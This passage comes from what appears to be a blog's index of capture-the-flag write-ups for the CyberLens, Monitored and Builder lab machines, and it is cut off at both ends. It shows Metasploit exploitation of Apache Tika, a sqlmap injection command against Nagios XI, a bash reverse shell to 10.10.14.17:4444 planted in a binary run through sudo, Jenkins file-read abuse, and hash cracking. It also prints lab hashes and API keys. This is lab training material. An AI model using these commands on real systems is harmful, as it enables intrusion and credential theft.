\u0026#34;org.apache.tika.parser.jpeg.JpegParser\u0026#34; ], \u0026#34;language\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;tiff:BitsPerSample\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;tiff:ImageLength\u0026#34;: \u0026#34;460\u0026#34;, \u0026#34;tiff:ImageWidth\u0026#34;: \u0026#34;460\u0026#34; } The file is been parsed, as we can see X-Parsed-By by org.apache.tika.parser.DefaultParser and org.apache.tika.parser.jpeg.JpegParser and quick googling gave us CVE-2018-1335 (More about CVE - https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/)\nAlso in the source code, it is sending PUT request to http://cyberlens.thm:61777/meta\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;script\u0026gt; document.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, function() { document.getElementById(\u0026#34;metadataButton\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function() { var fileInput = document.getElementById(\u0026#34;imageFileInput\u0026#34;); var file = fileInput.files[0]; var reader = new FileReader(); reader.onload = function() { var fileData = reader.result; fetch(\u0026#34;http://cyberlens.thm:61777/meta\u0026#34;, { method: \u0026#34;PUT\u0026#34;, body: fileData, headers: { \u0026#34;Accept\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/octet-stream\u0026#34; } }) .then(response =\u0026gt; { if (response.ok) { return response.json(); } else { throw new Error(\u0026#34;Error: \u0026#34; + response.status); } }) .then(data =\u0026gt; { var metadataOutput = document.getElementById(\u0026#34;metadataOutput\u0026#34;); metadataOutput.innerText = JSON.stringify(data, null, 2); }) .catch(error =\u0026gt; { console.error(\u0026#34;Error:\u0026#34;, error); }); }; reader.readAsArrayBuffer(file); }); }); \u0026lt;/script\u0026gt; I have searched this exploit in Metasploit and luckily they have one.\nmsf6 \u0026gt; search apache tika\rMatching Modules\r================\r# Name Disclosure Date Rank Check Description\r- ---- --------------- ---- ----- -----------\r0 exploit/windows/http/apache_tika_jp2_jscript 2018-04-25 excellent Yes Apache Tika Header Command Injection\rmsf6 \u0026gt; use 0 Here are options\nNow, run this exploit,\nC:\\Users\\CyberLens\\Desktop\u0026gt;type user.txt\rTHM{T1k4-CV3-f0r-7h3-w1n} Root Flag There is a text file in management folder, it says\nC:\\Users\\CyberLens\u0026gt;type Documents\\Management\\CyberLens-Management.txt\rRemember, manual enumeration is often key in an engagement ;)\rCyberLens\rHackSmarter123 But, I dont think this file is that useful, now moving the shell to background using background. Now, use use post/multi/recon/local_exploit_suggester to find local exploit. It seems, there are multiple exploit.\nThis is definitely vulnerable -exploit/windows/local/always_install_elevated: The target is vulnerable.\nSetting the options,\nRunning the exploit,\nC:\\Users\\Administrator\\Desktop\u0026gt;type admin.txt\rTHM{3lev@t3D-4-pr1v35c!} ","description":"Detailed walkthrough of the mKingdom room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.","id":3,"section":"posts","tags":["TryHackMe","CVE-2018-1335","Metasploit"],"title":"TryHackMe Writeup - CyberLens Room","uri":"https://g4nd1v.github.io/posts/tryhackme-cyberlens/"},{"content":" Title Monitored Description Monitored is HackTheBox Medium Linux Based Machine. Difficulty Medium Maker TheCyberGeek and ruycr4ft Nmap TCP Scan\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 └─$ nmap -sC -sV -oA nmap/monitered 10.129.239.185 [1/76] # Nmap 7.94SVN scan initiated Sun Jan 14 19:57:43 2024 as: nmap -sC -sV -oA nmap/monitered 10.129.239.185 Nmap scan report for 10.129.239.185 Host is up (0.087s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) | ssh-hostkey: | 3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA) | 256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA) |_ 256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519) 80/tcp open http Apache httpd 2.4.56 |_http-title: Did not follow redirect to https://nagios.monitored.htb/ |_http-server-header: Apache/2.4.56 (Debian) 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X 443/tcp open ssl/http Apache httpd 2.4.56 ((Debian)) |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.56 (Debian) |_http-title: Nagios XI | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK | Not valid before: 2023-11-11T21:46:55 |_Not valid after: 2297-08-25T21:46:55 Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . UDP Scan\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 └─$ sudo nmap -sU --min-rate 10000 10.10.11.248 [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 00:09 EDT Nmap scan report for monitored.htb (10.10.11.248) Host is up (0.012s latency). Not shown: 992 open|filtered udp ports (no-response) PORT STATE SERVICE 21/udp closed ftp 123/udp open ntp 161/udp open snmp 631/udp closed ipp 19039/udp closed unknown 19933/udp closed unknown 21354/udp closed unknown 55544/udp closed unknown Firstly, I have added IP in /etc/hosts associated with monitored.htb and nagios.monitored.htb — On visiting website at nagios.monitored.htb it seems we have a login page, I have tried basic SQL injection attacks in this portal, but it is of no use.\nI have searched for nagios on google, and found there are multiple vulnerabilities on this software, I sorted the exploits by latest date and then found that, it will require username and password. I tried to find that from other ports in TCP but no luck.\nI tried to move my testing to UDP ports, in UDP there are 2 ports that are open. One of them is snmp. So using snmpwalk I have begin my pentesting. I have tried with smnpwalk and found that there are number of strings to look, therefore I have used grep in order to find username, password or something interesting file.\nIt seems that it is using this command → sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB — from this we can conclude that svc is the user and XjH7VCehowpR1xZB might be it’s password. Next, I tried to login in the website. But it gave me this error → The specified user account has been disabled or does not exist. That means the username and password is correct, but the account is disabled.\nAfter researching about nagios I found that it is using API to authenticate and from the exploits before, it was also using APIs. Therefore, I googled API about it by searching error and learning how to authenticate in nagios. I found this link which is very helpful - https://support.nagios.com/forum/viewtopic.php?t=58783\nIt says, use this to authenticate → curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin\u0026amp;password=YOURPASS\u0026amp;valid_min=5'\nVoila, we got the token, simply using ?token=\u0026lt;TOKEN\u0026gt; in web will bypass the account restrictions. Like this — https://nagios.monitored.htb/nagiosxi/?token=fd8dd9d35d2feaf0b9f6444dd67a197d3d639de1\nUser Flag Now, as we are inside the website, we got user cookie, we can use CVEs which we found earlier.\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-40931\nhttps://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567\nCVE is all about SQL Injection, we can directly exploit it using sqlmap.\nsqlmap -u \u0026quot;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php\u0026quot; --data=\u0026quot;id=3\u0026amp;action=acknowledge_banner_message\u0026quot; --cookie \u0026quot;nagiosxi=eoas0cdgnqdpcmdn243jm2gson\u0026quot; --dbms=MySQL --level=1 --risk=1 -D nagiosxi -T xi_users --dump\nWe found password hashes from database.\n1 2 3 4 5 6 7 8 9 Database: nagiosxi Table: xi_users [2 entries] +---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+ | user_id | email | name | api_key | enabled | password | username | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket | last_edited_by | login_attempts | last_password_change | +---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+ | 1 | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1 | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0 | 1701931372 | 1 | 1701427555 | 0 | 0 | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0 | 5 | 0 | 1701427555 | | 2 | svc@monitored.htb | svc | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0 | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc | 1 | 1699724476 | 1 | 1699728200 | 1699634403 | 1716269191 | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1 | 9 | 1699697433 | +---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+ I have added this hashes in file, but I cannot be able to crack this hashes. Next thing I searched is is there any way I can login to user with api_key as it is provided in database.\nOn google different ways to login in nagios, I found this exploit, in which using createAdmin function, we got the hint of how to create admin user from just api key. We have to send the admin api key to this post request /nagiosxi/api/v1/system/user?apikey=\u0026lt;api_key\u0026gt; with this body username=g4nd1v\u0026amp;password=whoami\u0026amp;name=g4nd1v\u0026amp;email=whoami@test.com\u0026amp;auth_level=admin\nNow, we can login with our username and password, that is g4nd1v:whoami and boom we are logged in as admin. From the dashboard tab, go to configure → core config manager → commands → new command — add our rev shell over here, then save and apply configuration.\nAgain go to configure → core config manager → services → add new → select rev shell and then run command. Then boom, we got the shell.\n1 2 3 4 5 6 7 nagios@monitored:~$ ls ls cookie.txt user.txt nagios@monitored:~$ cat user.txt cat user.txt f37c90b5afd59a48ebf10fca1db7c7b6 Root Flag sudo -l gave a list of command we can execute as root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 nagios@monitored:~$ sudo -l sudo -l Matching Defaults entries for nagios on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User nagios may run the following commands on localhost: (root) NOPASSWD: /etc/init.d/nagios start (root) NOPASSWD: /etc/init.d/nagios stop (root) NOPASSWD: /etc/init.d/nagios restart (root) NOPASSWD: /etc/init.d/nagios reload (root) NOPASSWD: /etc/init.d/nagios status (root) NOPASSWD: /etc/init.d/nagios checkconfig (root) NOPASSWD: /etc/init.d/npcd start (root) NOPASSWD: /etc/init.d/npcd stop (root) NOPASSWD: /etc/init.d/npcd restart (root) NOPASSWD: /etc/init.d/npcd reload (root) NOPASSWD: /etc/init.d/npcd status (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php * (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php * (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php * (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh * (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh * (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh * One interesting script is /usr/local/nagiosxi/scripts/manage_services.sh which manages nagios, starts, stops, restart. I found this interesting also while checking the processes using ps -ef I found that the binary /usr/local/nagios/bin/nagios is also owned by nagios,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 nagios@monitored:~$ cd /usr/local/nagios/bin nagios@monitored:/usr/local/nagios/bin$ mv nagios nagios.bk ----- \u0026lt;import this script using python\u0026gt; ---- #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.17/4444 0\u0026gt;\u0026amp;1 ---- \u0026lt;and replace with nagios\u0026gt; ---- nagios@monitored:/usr/local/nagios/bin$ chmod +x nagios nagios@monitored:/usr/local/nagios/bin$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios Start Reverse shell on port 4444 on new tab and boom, we will get the shell.\n1 2 root@monitored:/root# cat root.txt 12211c34944207f567ba8a6824e8a629 ","description":"Detailed walkthrough of the Monitored box on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.","id":4,"section":"posts","tags":["HackTheBox","SNMP","nagios"],"title":"HackTheBox Writeup - Monitored Box","uri":"https://g4nd1v.github.io/posts/hackthebox-monitored/"},{"content":" Title Builder Description Builder is HackTheBox Medium Linux Based Machine. Difficulty Medium Maker polarbearer and amra13579 Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 └─$ nmap -sC -sV -oA nmap/builder 10.10.11.10 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 22:59 EDT Nmap scan report for 10.10.11.10 Host is up (0.055s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75🇩🇪4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 8080/tcp open http Jetty 10.0.18 | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Jetty(10.0.18) | http-robots.txt: 1 disallowed entry |_/ |_http-title: Dashboard [Jenkins] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . So basically there are 2 ports that are open, that is, 22 and 8080\nUser Flag On port 8080 we have Jenkins service running and it’s version is 2.441\nFrom quick googling, I found that it has CVE-2024-23897 - https://www.exploit-db.com/exploits/51993 → we can able to read file on server.\nDownload this file and test it with /etc/passwd\nInterested in learning more about this vulnerability? Here → https://www.jenkins.io/security/advisory/2024-01-24/\nNow, in order to check environment variables, we can use /proc/self/environ file.\n1 2 3 4 \u0026gt; /proc/self/environ HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_refer ence_file.logPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_UC=https://updates.jenkins.ioSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/l ocal/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin Now that we know the home directory, we can get the user flag.\n1 2 \u0026gt; /var/jenkins_home/user.txt 725ca98881930e7627e470c7e9855880 Root Flag Now, in order to enumerate more in the machine, we need to know what is the file structure of Junkins, that is why I have pulled Jenkins images from docker and navigate path in my local machine in order to gain understanding of different files and folders.\nFirstly, we have to run docker in one tab using sudo docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17 and then on other tab, we can start the container - sudo docker exec -it \u0026lt;id\u0026gt; /bin/sh - we will get \u0026lt;id\u0026gt; from docker ps\nFile Structure from local file just for understanding. So basically here there is users folder and in that folder, there is users.xml file in which it contains the user information of Jenkins. When we read file, we found it has admin and the another name admin_14267207368007926863 which is indeed another directory and then after going in that directory we found config.xml in which there is the password for admin user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ cd /var/jenkins_home $ ls config.xml copy_reference_file.log failed-boot-attempts.txt hudson.model.UpdateCenter.xml jenkins.telemetry.Correlator.xml jobs nodeMonitors.xml plugins secret.key secret.key.not-so-secret secrets userContent users war $ cd users $ ls admin_14267207368007926863 users.xml $ cat users.xml \u0026lt;?xml version=\u0026#39;1.1\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt; \u0026lt;hudson.model.UserIdMapper\u0026gt; \u0026lt;version\u0026gt;1\u0026lt;/version\u0026gt; \u0026lt;idToDirectoryNameMap class=\u0026#34;concurrent-hash-map\u0026#34;\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;string\u0026gt;admin\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;admin_14267207368007926863\u0026lt;/string\u0026gt; \u0026lt;/entry\u0026gt; \u0026lt;/idToDirectoryNameMap\u0026gt; \u0026lt;/hudson.model.UserIdMapper\u0026gt; $ cd admin_14267207368007926863 $ ls config.xml So, we will do same thing HTB’s machine.\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt; /var/jenkins_home/users/users.xml \u0026lt;?xml version=\u0026#39;1.1\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt; \u0026lt;string\u0026gt;jennifer_12108429903186576833\u0026lt;/string\u0026gt; \u0026lt;idToDirectoryNameMap class=\u0026#34;concurrent-hash-map\u0026#34;\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;string\u0026gt;jennifer\u0026lt;/string\u0026gt; \u0026lt;version\u0026gt;1\u0026lt;/version\u0026gt; \u0026lt;/hudson.model.UserIdMapper\u0026gt; \u0026lt;/idToDirectoryNameMap\u0026gt; \u0026lt;hudson.model.UserIdMapper\u0026gt; \u0026lt;/entry\u0026gt; File to download: We found, there is a user named as jennifer and the directory name is jennifer_12108429903186576833.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 \u0026gt; var/jenkins_home/users/jennifer_12108429903186576833/config.xml [22/49] \u0026lt;hudson.tasks.Mailer_-UserProperty plugin=\u0026#34;mailer@463.vedf8358e006b_\u0026#34;\u0026gt; \u0026lt;hudson.search.UserSearchProperty\u0026gt; \u0026lt;roles\u0026gt; \u0026lt;jenkins.security.seed.UserSeedProperty\u0026gt; \u0026lt;/tokenStore\u0026gt; \u0026lt;/hudson.search.UserSearchProperty\u0026gt; \u0026lt;timeZoneName\u0026gt;\u0026lt;/timeZoneName\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;jenkins.security.LastGrantedAuthoritiesProperty\u0026gt; \u0026lt;flags/\u0026gt; \u0026lt;hudson.model.MyViewsProperty\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;/jenkins.security.ApiTokenProperty\u0026gt; \u0026lt;views\u0026gt; \u0026lt;string\u0026gt;authenticated\u0026lt;/string\u0026gt; \u0026lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\u0026#34;display-url-api@2.200.vb_9327d658781\u0026#34;\u0026gt; \u0026lt;user\u0026gt; \u0026lt;name\u0026gt;all\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;\u0026lt;/description\u0026gt; \u0026lt;emailAddress\u0026gt;jennifer@builder.htb\u0026lt;/emailAddress\u0026gt; \u0026lt;collapsed/\u0026gt; \u0026lt;/jenkins.security.seed.UserSeedProperty\u0026gt; \u0026lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty\u0026gt; \u0026lt;/hudson.model.MyViewsProperty\u0026gt; \u0026lt;domainCredentialsMap class=\u0026#34;hudson.util.CopyOnWriteMap$Hash\u0026#34;/\u0026gt; \u0026lt;filterQueue\u0026gt;false\u0026lt;/filterQueue\u0026gt; \u0026lt;jenkins.security.ApiTokenProperty\u0026gt; \u0026lt;primaryViewName\u0026gt;\u0026lt;/primaryViewName\u0026gt; \u0026lt;/views\u0026gt; \u0026lt;/hudson.model.TimeZoneProperty\u0026gt; \u0026lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\u0026#34;credentials@1319.v7eb_51b_3a_c97b_\u0026#34;\u0026gt; \u0026lt;/hudson.model.PaneStatusProperties\u0026gt; \u0026lt;/hudson.tasks.Mailer_-UserProperty\u0026gt; \u0026lt;tokenList/\u0026gt; \u0026lt;jenkins.console.ConsoleUrlProviderUserProperty/\u0026gt; \u0026lt;/hudson.model.AllView\u0026gt; \u0026lt;timestamp\u0026gt;1707318554385\u0026lt;/timestamp\u0026gt; \u0026lt;owner class=\u0026#34;hudson.model.MyViewsProperty\u0026#34; reference=\u0026#34;../../..\u0026#34;/\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty\u0026gt; \u0026lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty\u0026gt; \u0026lt;hudson.security.HudsonPrivateSecurityRealm_-Details\u0026gt; \u0026lt;insensitiveSearch\u0026gt;true\u0026lt;/insensitiveSearch\u0026gt; \u0026lt;properties class=\u0026#34;hudson.model.View$PropertyList\u0026#34;/\u0026gt; \u0026lt;hudson.model.TimeZoneProperty\u0026gt; \u0026lt;hudson.model.AllView\u0026gt; \u0026lt;/hudson.security.HudsonPrivateSecurityRealm_-Details\u0026gt; \u0026lt;providerId\u0026gt;default\u0026lt;/providerId\u0026gt; \u0026lt;/roles\u0026gt; \u0026lt;/jenkins.security.LastGrantedAuthoritiesProperty\u0026gt; \u0026lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty\u0026gt; \u0026lt;hudson.model.PaneStatusProperties\u0026gt; \u0026lt;?xml version=\u0026#39;1.1\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt; \u0026lt;fullName\u0026gt;jennifer\u0026lt;/fullName\u0026gt; \u0026lt;seed\u0026gt;6841d11dc1de101d\u0026lt;/seed\u0026gt; \u0026lt;id\u0026gt;jennifer\u0026lt;/id\u0026gt; \u0026lt;version\u0026gt;10\u0026lt;/version\u0026gt; \u0026lt;tokenStore\u0026gt; \u0026lt;filterExecutors\u0026gt;false\u0026lt;/filterExecutors\u0026gt; \u0026lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin=\u0026#34;theme-manager@215.vc1ff18d67920\u0026#34;/\u0026gt; \u0026lt;passwordHash\u0026gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a\u0026lt;/passwordHash\u0026gt; File to download: In config.php we found this passwordHash - #jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a\nStore this hash in user.hash and then using john we can get the password.\n1 2 3 4 5 6 7 john --wordlist=/usr/share/wordlists/rockyou.txt user.hash Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status princess (#jbcrypt) User Password jennifer princess Now that I have user and password, I tried to login with SSH, but no luck. Next logical step will be to login with this creds from Jenkin’s Instance on web.\nAfter messing around with in the dashboard, I found Credentials tab in Manage Jenkins, in that there is a cred for root. On navigating the file, we can see something like this,\nThe key is Concealed for Confidentiality. However in the source code we can able to see the private key.\n1 {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